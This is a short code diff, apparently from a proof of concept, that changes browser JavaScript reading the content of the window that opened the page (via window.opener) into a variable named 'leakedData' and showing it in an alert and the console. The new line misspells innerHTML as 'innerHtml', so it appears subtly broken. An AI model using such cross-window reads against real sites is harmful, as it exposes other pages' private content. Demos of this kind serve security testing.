@@ -1,9 +1,7 @@
 
-while (true) {
-    var leakedData = window.opener.document.getElementsByClassName("section--2")[0].innerText
-    alert(leakedData)
-}
-
+var leakedData = window.opener.document.documentElement.innerHtml
+console.log(leakedData)
+alert(leakedData)
 
 
 
